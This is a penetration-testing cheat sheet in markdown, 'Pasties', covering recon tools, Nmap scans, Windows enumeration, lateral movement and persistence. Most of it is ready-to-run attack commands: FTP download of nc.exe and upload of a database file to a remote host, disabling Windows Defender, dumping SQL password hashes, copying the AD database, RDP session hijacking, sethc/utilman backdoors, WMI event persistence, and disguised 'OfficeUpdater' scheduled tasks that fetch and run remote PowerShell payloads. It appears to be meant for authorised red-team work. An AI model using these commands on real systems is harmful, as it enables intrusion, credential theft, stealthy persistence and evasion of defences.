```
     __________  _____    ____________________.______________ _________
       \______   \/  _  \  /   _____/\__    ___/|   \_   _____//   _____/
        |     ___/  /_\  \ \_____  \   |    |   |   ||    __)_ \_____  \ 
        |    |  /    |    \/        \  |    |   |   ||        \/        \
        |____|  \____|__  /_______  /  |____|   |___/_______  /_______  /
                        \/        \/                        \/        \/ 
```

# Pasties

'Pasties' started as a small file used to collect random bits of information and scripts that were common to many individual tests. Most of this is just a consolidation of publicly available information and things that Joe Vest (@joevest), Andrew Chiles (@andrewchiles), Derek Rushing, or myself (@minis_io) have found useful. Over time additional sections, section placeholders, snippets, and links were added for "quick reference" and has grown to quite a sizable markdown file. The more complex or longer sections will be separated into smaller more detailed write-ups; however, we decided to drop the short and generic info for public use now.  Pasties data will also eventually be formatted and added to the wiki. 
 

[TOC]


# Penetration Testing Methodology References

Penetration Testing Framework

- http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html

Penetration Testing Execution Standard

- http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines

# OSINT

Good writeup on passive information gathering

- http://www.securitysift.com/passive-reconnaissance/

Password Breach Database, requires subscription

https://leakbase.pw/

## FOCA

## Maltego

## ReconNG

## Metagoofil

Source: http://resources.infosecinstitute.com/kali-reporting-tools/#gref

Metagoofil is an information gathering tool designed for extracting metadata of public documents (pdf,doc,xls,ppt,docx,pptx,xlsx) related to a target domain. It can give a lot of important information by scanning the obtained files. It can generate an HTML page with the result of the metadata extracted, plus a list of potential usernames, very useful for preparing a brute force attack on open services like ftp, web application, VPN, pop3, etc.

Metagoofil performs the following:

- Searches the given file type using the Google search engine
- Downloads all the documents found
- Extracts metadata from downloaded documents
- Saves the result in HTML file

Perform document metadata searching on target domain using first 200 google results

```

metagoofil -d .com -t pdf,doc,xls,ppt,odp,ods,docx,xlsx,pptx -l 200 -n 5 -o /tmp/metagoofil/ -f /tmp/metagoofil/result.html

```

## censys.io

Censys is a search engine that allows computer scientists to ask questions about the devices and networks that compose the Internet. Driven by Internet-wide scanning, Censys lets researchers find specific hosts and create aggregate reports on how devices, websites, and certificates are configured and deployed.

- Create an account and get an API key for use in ReconNG or manual searching
- https://censys.io/ipv4?q=

Python API
```
# pip install censys

import censys.ipv4
c = censys.ipv4.CensysIPv4(api_id="Get from MyAccount at censys.io", api_secret="Get from MyAccount at censys.io")
ranges=["X.X.X.0/24", "X.X.X.0/24", "X.X.X.0/24"]
for range in ranges:
results = c.search(range)
for result in results:
for port in result["protocols"]:
print result["ip"] + "," + port
```

## dsnrecon

Normal dns reverse lookup of IP range with CSV output
```
dnsrecon -t rvl -r 1.2.3.4/24 -c output.csv
```

Perform default enumeration of a domain
```
dnsrecon -d
```

Perform zone transfer attempt
```
dnsrecon -t axfr -d

╰ $ dnsrecon -h
Version: 0.8.10
Usage: dnsrecon.py

Options:
-h, --help Show this help message and exit.
-d, --domain Target domain.
-r, --range IP range for reverse lookup brute force in formats (first-last) or in (range/bitmask).
-n, --name_server Domain server to use. If none is given, the SOA of the target will be used.
-D, --dictionary Dictionary file of subdomain and hostnames to use for brute force.
-f Filter out of brute force domain lookup, records that resolve to the wildcard defined
IP address when saving records.
-t, --type Type of enumeration to perform:
std SOA, NS, A, AAAA, MX and SRV if AXRF on the NS servers fail.
rvl Reverse lookup of a given CIDR or IP range.
brt Brute force domains and hosts using a given dictionary.
srv SRV records.
axfr Test all NS servers for a zone transfer.
goo Perform Google search for subdomains and hosts.
snoop Perform cache snooping against all NS servers for a given domain, testing
all with file containing the domains, file given with -D option.
tld Remove the TLD of given domain and test against all TLDs registered in IANA.
zonewalk Perform a DNSSEC zone walk using NSEC records.
-a Perform AXFR with standard enumeration.
-s Perform a reverse lookup of IPv4 ranges in the SPF record with standard enumeration.
-g Perform Google enumeration with standard enumeration.
-w Perform deep whois record analysis and reverse lookup of IP ranges found through
Whois when doing a standard enumeration.
-z Performs a DNSSEC zone walk with standard enumeration.
--threads Number of threads to use in reverse lookups, forward lookups, brute force and SRV
record enumeration.
--lifetime Time to wait for a server to response to a query.
--db SQLite 3 file to save found records.
--xml XML file to save found records.
--iw Continue brute forcing a domain even if a wildcard records are discovered.
-c, --csv Comma separated value file.
-j, --json JSON file.
-v Show attempts in the brute force modes.
```

## TheHarvester

Perform lookup against <domain> with additional DNS reverse on all ranges discovered
```
theharvester -d -c -n -b google -l 1000 [-f output]

Usage: theharvester options

-d: Domain to search or company name
-b: data source: google, googleCSE, bing, bingapi, pgp
linkedin, google-profiles, people123, jigsaw,
twitter, googleplus, all

-s: Start in result number X (default: 0)
-v: Verify host name via dns resolution and search for virtual hosts
-f: Save the results into an HTML and XML file
-n: Perform a DNS reverse query on all ranges discovered
-c: Perform a DNS brute force for the domain name
-t: Perform a DNS TLD expansion discovery
-e: Use this DNS server
-l: Limit the number of results to work with(bing goes from 50 to 50 results,
-h: use SHODAN database to query discovered hosts
google 100 to 100, and pgp doesn't use this option)

Examples:
theharvester -d microsoft.com -l 500 -b google
theharvester -d microsoft.com -b pgp
theharvester -d microsoft -l 200 -b linkedin
theharvester -d apple.com -b googleCSE -l 500 -s 300
```

## Nmap
https://github.com/bluscreenofjeff/CCDC-Scripts/blob/master/OpsPlan2016.txt

Host discovery
```
nmap -sn -n
nmap -A (run this second)
nmap -sV -F
nmap -p- -sV -O -T4 -v7 -sC
```

Open SMB shares
```
nmap --script=smb-enum-shares -p445
```

Open NFS Shares
```
nmap -p 111,2049 --script nfs-ls,nfs-showmount
```

UDP scan:
```
nmap -sU -F -Pn -v -d -sC -sV --open --reason -T5
```

Anonymous FTP
```
nmap -sC -sV -p21
nmap -sV -n -sS -Pn-vv --open -p21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221
```

VNC Brute
```
nmap --script=vnc-brute -p5800,5900
```

Rawr Scan
```
nmap -sV --open -T4 -v7 -p80,280,443,591,593,981,1311,2031,2480,3181,4444,4445,4567,4711,4712,5104,5280,5800,5988,5989,7000,7001,7002,8008,8011,8012,8013,8014,8042,8069,8080,8081,8243,8280,8281,8531,8887,8888,9080,9443,11371,12443,16080,18091,18092 -iL live-hosts.txt -oA web
```

MSSQL Scan
```
nmap -vv-sV -Pn-n -p1433 --script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=1433,smsql.username-sa,mssql.password-sa -oA
```

HTTP Scan
```
nmap -vv -sS -Pn-n -p80,443,8080 --script=http-vhosts,http-userdir-enum,http-apache-negotiation,http-backup-finder,http-config-backup,http-default-accounts,http-email-harvest,http-methods,http-method-tamper,http-passwd,http-robots.txt -oA
```

### IDS Evasion

Append extra random data to change default packet lengths
```
–data-length 15
```

Randomize scan order
```
-randomize-hosts
```

## Web

### Eyewitness
Get the most recent version
```
git clone https://github.com/ChrisTruncer/EyeWitness.git
```

Faster Scan
```
./EyeWitness.py --web -f hosts.txt --timeout 5 --threads 10 -d /mnt/event/Recon/ew --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https
```

Slow version via proxychains
```
proxychains ./EyeWitness.py --web -f hosts.txt --timeout 10 --threads 2 -d /mnt/event/Recon/ew --no-dns --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https

proxychains ./EyeWitness.py --web -x nmaphosts.xml --timeout 10 --threads 2 -d /mnt/event/Recon/ew2 --no-dns --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https
```

Proxychains specify a remote DNS server

http://carnal0wnage.attackresearch.com/2013/09/changing-proxychains-hardcoded-dns.html
```
On Kali linux its found here: /usr/lib/proxychains3/proxyresolv

#!/bin/sh
# This script is called by proxychains to resolve DNS names
# DNS server used to resolve names
DNS_SERVER=4.2.2.2

if [ $# = 0 ] ; then
echo " usage:"
echo " proxyresolv "
exit
fi

export LD_PRELOAD=libproxychains.so.3
dig $1 @$DNS_SERVER +tcp | awk '/A.+[0-9]+\.[0-9]+\.[0-9]/{print $5;}'
```

*Use Canary tokens to identify web front-end vulnerabilities*

In combination with Burp collaborator, identify configuration issues with web front-end appliances

For example, issue request to target domain with a custom Host header pointing to your collaborator/canary:

Request:
```
GET / HTTP/1.1
Host: uniqid.burpcollaborator.net
Connection: close
```

Response (on Collaborator):
```
GET / HTTP/1.1
Host: XX.X.XXX.XX:8082

HTTP/1.1 200 Connection Established
Date: Tue, 07 Feb 2017 16:32:50 GMT
Transfer-Encoding: chunked
Connection: close

Ok
/ HTTP/1.1 is unavailable
Ok
Unknown Command
Ok
Unknown Command
Ok
Unknown Command
Ok
```

[Canarytokens.org](https://canarytokens.org/generate#)
[Blog - Targeting HTTP's Hidden Attack Surface](http://blog.portswigger.net/2017/07/cracking-lens-targeting-https-hidden.html)

---

# Windows

## Built-in Commands

View your current user:
```
whoami
```

View information about the current user:
```
net user myuser(for a local user)
net user myuser /domain (for a domain user)
```

View the local groups:
```
net localgroup
```

View the local administrators:
```
net localgroup Administrators
```

Add a new user:
```
net user myuser mypass /add
```

Add a user in the local Administrators group:
```
net localgroup Administrators myuser /add
```

View the domain name of current machine:
```
net config workstation
net config server
```

View the name of the domain controller:
```
reg query "HKEY_LOCAL_MACHINE\ SOFTWARE\Microsoft\Windows\ CurrentVersion\Group Policy\ History" /v DCName
```

Get list of DCs
```
nltest /dclist:domainname
```

View the list of domain users:
```
C:\> wmic useraccount where (domain='%USERDOMAIN%') get Name > userlist.txt

PS C:\> ([adsisearcher]"objectCategory=User").Findall() | ForEach
{$_.properties.samaccountname} | Sort | Out-File -Encoding ASCII users.txt
```

View the list of domain admins:
```
net group "Domain Admins" /domain
```

View domain groups
```
net group /domain
powershell (new-object system.directoryservices.directorysearcher("(&(objectcategory=user)(samaccountname=$($env:username)))")).FindOne().GetDirectoryEntry().memberof
```

View the list of started services (search for antivirus):
```
net start
sc query
```

Stop a service:
```
net stop "Symantec Endpoint Protection"
```

View the list of started processes and the owner:
```
tasklist /v
```

Kill a process by its name:
```
taskkill /F /IM "cmd.exe"
```

Abort a shutdown/restart countdown:
```
shutdown /a
```

Download an executable from a remote FTP server:
```
echo open 10.1.2.3> C:\script.txt
echo user myftpuser>> C:\script.txt
echo pass myftppass>> C:\script.txt
echo get nc.exe>> C:\script.txt
echo bye>> C:\script.txt
ftp -s:script.txt
```

Upload a file to a remote FTP server:
```
echo open 10.1.2.3> C:\script.txt
echo user myftpuser>> C:\script.txt
echo pass myftppass>> C:\script.txt
echo put E:\backups\database.dbf>> C:\script.txt
echo bye>> C:\script.txt
ftp -s:script.txt
```

WMI call remote system
```
wmic /node:remote_computer process call create "netstat.exe -ano > C:\output.txt"
```

View established connections of current machine:
```
netstat -a -n -p tcp | find "ESTAB"
```

View open ports of current machine: netstat -a -n -p tcp | find "LISTEN"
```
netstat -a -n -p udp
```

View network configuration:
```
netsh interface ip show addresses
netsh interface ip show route
netsh interface ip show neighbors
```

View current network shares:
```
net share
```

Mount a remote share with the rights of the current user:
```
net use K: \\10.1.2.3\C$
```

Enable Remote Desktop:
```
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

One-Liner Windows Enumeration
Reference: https://gist.github.com/KyleHanslovan/cadf9737401b85422c84091855473eb7
```
whoami & hostname & ipconfig /all & net user /domain 2>&1 & net group /domain 2>&1 & net group "domain admins" /domain 2>&1 & net group "Exchange Trusted Subsystem" /domain 2>&1 & net accounts /domain 2>&1 & net user 2>&1 & net localgroup administrators 2>&1 & netstat -an 2>&1 & tasklist 2>&1 & sc query 2>&1 & systeminfo 2>&1 & reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" 2>&1 & net view & net view /domain & net user %USERNAME% /domain & nltest /dclist & gpresult /z
```

Change Windows Proxy Settings
```
Command to enable proxy usage:

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f

Command to disable proxy usage:

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 0 /f

Command to change the proxy address:

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d proxyserveraddress:proxyport /f

Also, in this case, it is a per-user setting than a system-wide setting.
```

### Mount a .win image remotely on target machine
```
Dism /get-wiminfo /wimfile:z:\win7\Acme_Win7.wim

Boot Dir
Dism /Mount-Wim /WimFile:z:\win7\Acme_Win7.wim /index:1 /MountDir:C:\windows\temp\offline

C: Drive
Dism /Mount-Wim /WimFile:z:\win7\Acme_Win7.wim /index:2 /MountDir:C:\windows\temp\offline

Dism /UnMount-Wim /MountDir:C:\windows\temp\offline /discard
```

### DSQUERY

Get attributues for all Windows hosts in the Domain
```
shell dsquery * -filter "(&(objectclass=computer) (objectcategory=computer) (operatingSystem=Windows*))" -limit 0 |dsget computer -dn -samid -desc -loc >c:\windows\temp\computers.log
```

Get attributes for computers in a specific OU
```
shell dsquery computer <OU=PUT OU HERE> -limit 0 |dsget computer -dn -samid -desc -l >c:\windows\temp\out.log
```

Get attributes for users in the specified OU
```
shell dsquery user <OU=PUT OU HERE> -limit 0 |dsget user -dn -samid -display -desc -office -tel -email -title -hmdir -profile -loscr -mustchpwd -canchpwd -pwdneverexpires -disabled
```

### SQLCMD

List Databases
```
sqlcmd -E -S localhost -Q "EXEC sp_databases;"
```

List Tables in Database
```
sqlcmd -E -S localhost -Q "SELECT * FROM DatabaseName.information_schema.tables;" -W -w 999 -s"," -o "c:\windows\temp\RecruiterProd_MSCRM_tables.csv"
```

Retrieve table contents
```
sqlcmd -E -S localhost -d DatabaseName -Q "SELECT * FROM SystemUserBase;" -W -w 999 -s"," -o "c:\windows\temp\RecruiterProd_MSCRM_userbase.csv"
```

Dump MSSQL Password Hashes
```
sqlcmd -E -S localhost -Q "SELECT name, password_hash FROM master.sys.sql_logins;"
```

### NTDSUTIL
Built-in utility to create backup copy of the AD database
```
ntdsutil "ac i ntds" "ifm" create full c:\temp" q q
```

### Applocker
List Applocker's effective policy on the system
```
Get-ApplockerPolicy -Effective
```

### Windows Defender

Remove definitions and disable AV protection (Useful when Powershell scripts are being blocked by Defender)
```
c:\program files\windows defender\mpcmdrun.exe" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true
```

### APPCMD

Get virtual directories in IIS
```
c:\windows\system32\inetsrv\appcmd.exe list vdir /text:physicalpath
```

## Windows Lateral Movement

RDP Hijacking

If you have SYSTEM context on a host, you can assume the RDP sessions of other users without credentials using the tscon.exe command.

Gain access to cmd.exe to issue the tscon.exe command over RDP by creating a backdoor with Stickkeys or Utilman. Use scheduled tasks (as SYSTEM) or create a service to execute the desired command.

[RDP hijacking — how to hijack RDS and RemoteApp sessions transparently to move through an organisation](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6)
```
# View RDP sessions on system your RDP'd to with administrative permissions
# Locally
quser

# Remote
quser /server:

# Create a service that will swap your SESSIONNAME with the desired disconnected session
sc create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#XX" error= "ignore"

# Start service
net start sesshijack
or
sc start sesshijack
```

Linux to Windows Remoting

- In windows run
```
winrm set winrm/config/Service/Auth @{Basic="true"}
winrm set winrm/config/Service @{AllowUnencrypted="true"}
```

- In linux run
```
$cred = Get-Credential
Enter-PSSession -ComputerName 'winserver1' -Credential $cred -Authentication Basic
```

PowerShell Remoting over SSH
```
Enter-PSSession -Hostname -Username james -SSHTransport
```

Native user to system mapping (all auth users)

```

get-eventlog "Security" -Computername | Where {$_.Message -like "*Username*" - AND "Source Network Address"}|export-csv C:\path

```

## Windows Persistence Methods

### Registry Keys

#### Modify registry keys
```
#Add a key/value
reg add \\\ /v """ /t /d

#Delete a key/value
reg delete \\\ /v ""
```

#### Userinit Key
This key specifies what program should be launched right after a user logs into Windows. The default program for this key is C:\windows\system32\userinit.exe. Userinit.exe is a program that restores your profile, fonts, colors, etc for your user name. It is possible to add further programs that will launch from this key by separating the programs with a comma.
```
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit = (REG_SZ) C:\windows\system32\userinit.exe,c:\windows\badprogram.exe
```

#### Run Key
```
#System Wide
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

#Current Logged-On User Only
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
```

#### List Image File Execution Options (Debugger file executed when the target file is run)
```
HKLM\Software\MS\WindowsNT\CurrentVersion\Image File Execution Options\notepad.exe\debugger(REG_SZ = cmd.exe)
```

#### AppInit_DLLs
Load custom DLLs each time a program runs (If it loads USER32.dll). This is checked by most AV!

This value corresponds to files being loaded through the AppInit_DLLs Registry value. The AppInit_DLLs registry value contains a list of dlls that will be loaded when user32.dll is loaded. As most Windows executables use the user32.dll, that means that any DLL that is listed in the AppInit_DLLs registry key will be loaded also. This makes it very difficult to remove the DLL as it will be loaded within multiple processes, some of which can not be stopped without causing system instability. The user32.dll file is also used by processes that are automatically started by the system when you log on. This means that the files loaded in the AppInit_DLLs value will be loaded very early in the Windows startup routine allowing the DLL to hide itself or protect itself before we have access to the system.
```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Windows\AppInit_DLLs
```

#### No-reboot sethc/utilman option using a "debugger" key

Navigate to HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\
Make key called "sethc.exe"
Make a REG_SQ value called "Debugger"
Assign it "c:\windows\system32\cmd.exe" as the value
Hit SHIFT 5 times and get a shell as nt authority\system
```
reg add "\\hostname\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"
reg add "\\hostname\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"
```

Remove the debugger key
```
reg delete "\\hostname\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /f
reg delete "\\hostname\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /f
```

### File Storage Locations

#### Startup Folders
```
#All Users - Windows XP
C:\Documents and Settings\All Users\Start Menu\Programs\Startup

#All Users - Windows Vista+
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup

#User Profile - Windows XP
C:\Documents and Settings\\Start Menu\Programs\Startup

#User Profile - Windows Vista+
C:\Users\\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

#### SETHC/UTILMAN Replacement

Replace these binaries, may require a reboot to take effect
```
%WINDIR%\System32\sethc.exe
%WINDIR%\System32\utilman.exe
```

Hit shift 5 times = sethc.exe run by SYSTEM
Windows key + U = utilman.exe run by SYSTEM

#### Volume Shadow Copy (Restore Points)

Windows service that's constantly running - takes snapshots of system directories

Drop Malware -> Create VSC (ReadOnly) -> Delete Malware -> Use WMIC to run VSC of malware

Registry Key to Disable Volume Shadow Copy
```
HKLM\System\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot
```

#### VSSADMIN - native windows utility

vssadmin create command only applies to Server OS (Win2k3,2008)
```
vssadmin list shadows
vssadmin create shadow /for=C:
wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create "cmd /c vssadmin create shadow /for=C
mklink /D C:\VscAccess \\?\GLOBALROOT\Device\HardDiskVolumeShadowCopy1
copy \\?\GLOBALROOT\Device\HardDiskVolumeShadowCopy4\path\to\some\file e:\files
```

#### Use WMIC process call to run an .exe from a Volume Shadow Copy
```
wmic process call create \\.\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\evil.exe
```

This process will not show the imagename (executable filename) or commandline parameters in the task list.
The file cannot be individually deleted from the shadow copy once created. The entire shadow copy must be deleted to remove it.
```
root@kali:~# wmis -U DOMAIN\domainadminsvc%domainadminsvc123 //ServerName \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\evil.exe
NTSTATUS: NT_STATUS_OK - Success
```

In Kali Linux you could use the WMIS package to do the same thing:
```
wmis -U DOMAIN\domainadminsvc%domainadminsvc123 //ServerName \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\evil.exe
NTSTATUS: NT_STATUS_OK - Success
```

### Task Scheduling

#### AT
Executes as system and must be an Admin to run it. Check groups with whoami /groups
```
at 13:20 /interactive cmd

net user \\target /user:Domain\user pass
net time \\target
at \\target 13:20 c:\temp\evil.bat
```

#### SCHTASKS
Any user can create a task

Schedule a binary to run with arguments on system events
```
#On System Startup
schtasks /create /TN OfficeUpdaterA /tr ""c:\evil32.exe" -k password -n services" /SC onstart /RU system /RL HIGHEST
schtasks /create /TN OfficeUpdaterD /tr "\"c:\Program Files\evil32.exe\" -k password -n services" /SC onstart /RU system /RL HIGHEST

#On User Login
schtasks /create /TN OfficeUpdaterB /tr ""c:\evil32.exe" -k password -n services" /SC onlogon
schtasks /create /TN OfficeUpdaterE /tr "\"c:\Program Files\evil32.exe\" -k password -n services" /SC onlogon

#On Idle
schtasks /create /TN OfficeUpdaterC /tr ""c:\evil32.exe" -k password -n services" /SC onidle /i 30''''
schtasks /create /TN OfficeUpdaterF /tr "\"c:\Program Files\evil32.exe\" -k password -n services" /SC onidle /i 60
```

Use the Powershell Web Delivery (Download and Execute) module in Metasploit 'exploit\windows\misc\psh_web_delivery'
```
#(X86) - On User Login
schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onlogon /ru System

#(X86) - On System Start
schtasks /create /tn OfficeUpdaterB /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onstart /ru System

#(X86) - On User Idle (30mins)
schtasks /create /tn OfficeUpdaterC /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onidle /i 30

#(X64) - On User Login
schtasks /create /tn OfficeUpdaterA /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onlogon /ru System

#(X64) - On System Start
schtasks /create /tn OfficeUpdaterB /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'" /sc onstart /ru System

#(X64) - On User Idle (30mins)
schtasks /create /tn OfficeUpdaterC /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30
```

#### Additional Notes

Scheduled Tasks binary paths CANNOT contain spaces because everything after the first space in the path is considered to be a command-line argument. To workaround this behavior, enclose the /TR path parameter between backslash (\) AND quotation marks ("):

Delete scheduled task without prompting
```
schtasks /delete /f /TN taskname
```

Detailed scheduled tasks listing
```
schtasks /query /V /FO list
```

View scheduled tasks log (for troubleshooting)
```
notepad c:\windows\schedlgu.txt (Windows XP)

notepad c:\windows\tasks\schedlgu.txt (Vista+)

```

### Windows Service
```
sc query
sc create <\\Target(optional)> <servicename> binPath= <service binary path> type= share start= auto DisplayName= <display name>
sc delete <servicename>
```

### DLL-Hijacking

Order of DLL Loading
```
1. The directory from which the application is loaded
2. The current directory
3. The system directory, usually C:\\Windows\\System32\\ (The GetSystemDirectory function is called to obtain this directory.)
4. The 16-bit system directory - There is no dedicated function to retrieve the path of this directory, but it is searched as well.
5. The Windows directory. The GetWindowsDirector function is called to obtain this directory.
6. The directories that are listed in the PATH environment variable.
```

Many systems use bginfo (seen it a lot in operational sys). Drop Riched32.dll in the dir with bginfo.exe. Codex.

Older list of dlls as well (2010). https://www.exploit-db.com/dll-hijacking-vulnerable-applications/

On Windows 7 there are three executables that could be exploited and associated DLLs listed below
```
C:\windows\ehome\Mcx2Prov.exe
C:\Windows\ehome\CRYPTBASE.dll

C:\windows\System32\sysprep\sysprep.exe
C:\Windows\System32\sysprep\CRYPTSP.dll
C:\windows\System32\sysprep\CRYPTBASE.dll
C:\Windows\System32\sysprep\RpcRtRemote.dll
C:\Windows\System32\sysprep\UxTheme.dll

C:\windows\System32\cliconfg.exe
C:\Windows\System32\NTWDBLIB.DLL
```

On Windows 8 there are also three executables that could be exploited and associated DLLs listed below
```
C:\windows\System32\sysprep\sysprep.exe
C:\windows\System32\sysprep\CRYPTBASE.dll
C:\Windows\System32\Sysprep\dwmapi.dll
C:\Windows\System32\Sysprep\SHCORE.dll

C:\windows\System32\cliconfg.exe
C:\Windows\System32\NTWDBLIB.DLL

C:\windows\System32\pwcreator.exe
C:\Windows\System32\vds.exe
C:\Windows\System32\UReFS.DLL
```

Windows 8.1 there are also three executables that could be exploited and associated DLLs listed below
```
C:\windows\System32\sysprep\sysprep.exe
C:\Windows\System32\Sysprep\SHCORE.dll
C:\Windows\System32\Sysprep\OLEACC.DLL

C:\windows\System32\cliconfg.exe
C:\Windows\System32\NTWDBLIB.DLL

C:\windows\System32\pwcreator.exe
C:\Windows\System32\vds.exe
C:\Program Files\Common Files\microsoft shared\ink\CRYPTBASE.dll
C:\Program Files\Common Files\microsoft shared\ink\CRYPTSP.dll
C:\Program Files\Common Files\microsoft shared\ink\dwmapi.dll
C:\Program Files\Common Files\microsoft shared\ink\USERENV.dll
C:\Program Files\Common Files\microsoft shared\ink\OLEACC.dll
```

#### linkinfo.dll Replacement

Windows explorer in older systems loads linkinfo.dll from c:\windows over c:\windows\system32 if it exists
```
copy evil.dll c:\windows\linkinfo.dll
```

### WMI Event Persistence via Powershell
WMI Event persistence explained, you can find a bloated version in powersploit.
Three parts to this:
* WMI Event Filter
* Event Consumer
* Filter/Consumer Binding
This technique gets you *SYSTEM* level persistence, requires admin rights to execute.
Autoruns doesn't even check for this yet. (doubt any AVs are either)
Difficult to detect, Difficult to remove if you dont know what youre doing.
#### WMI Event Filter
Create an event that checks every 60 seconds for a change in Win32_PerfFormattedData_PerfOS_System. (this is always changing)

```
$EventFilter = ([WMICLASS]"\\.\root\subscription:__EventFilter").CreateInstance()
$EventFilter.QueryLanguage = "WQL"
$EventFilter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
$EVentFilter.EventNamespace = "root\cimv2"
$EventFilter.Name = "OBVIOUSHACKER"
$Result = $EventFilter.Put()
$Filter = $Result.Path
```

http://msdn.microsoft.com/en-us/library/aa394639(v=vs.85).aspx

#### Event Consumer
Configure what to execute once the event occurs.
Current example is just a ping.

```
$InstanceConsumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
$InstanceConsumer.Name = "OBVIOUSHACKER"
$InstanceConsumer.CommandLineTemplate = "ping 127.0.0.1 -n 100" #CMD TO EXECUTE HERE
$InstanceConsumer.WorkingDirectory = "C:\\windows\\system32"
$Result = $InstanceConsumer.Put()
$Consumer = $Result.Path
```

http://msdn.microsoft.com/en-us/library/aa389231(v=vs.85).aspx
http://msdn.microsoft.com/en-us/library/aa393649(v=vs.85).aspx

#### Filter/Consumer Binding
This is the object that correlates the Filter with the Consumer.
Runs as system as a child of WmiPrvSE.exe under the svchost.exe running Dcom service.

```
$InstanceBinding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
$InstanceBinding.Filter = $Filter
$InstanceBinding.Consumer = $Consumer
$Result = $InstanceBinding.Put()
```

http://msdn.microsoft.com/en-us/library/aa394647(v=vs.85).aspx

#### REMOVAL
The filter name would change depending on what you call the wmi event on your target (OBVIOUSHACKER shown as the example)

```
Get-WmiObject __eventFilter -namespace root\subscription -filter "name='OBVIOUSHACKER'"| Remove-WmiObject
Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='OBVIOUSHACKER'" | Remove-WmiObject
Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match 'OBVIOUSHACKER'} | Remove-WmiObject
```
[Some more detailed information on the subject](http://www.exploit-monday.com/2013/04/PersistenceWithPowerShell.html)

http://www.bleepingcomputer.com/tutorials/windows-program-automatic-startup-locations/

### Malicious Outlook Rules

* https://labs.mwrinfosecurity.com/blog/malicous-outlook-rules/
* Ruler
- https://github.com/sensepost/ruler

### Windows Remote Management (WinRM) / PSRemoting

* Listens on 5985/5986 by default and allows interactive shell access over HTTP/S
* Find by scanning for /wsman and looking for HTTP 402 errors (or use Metasploit module)
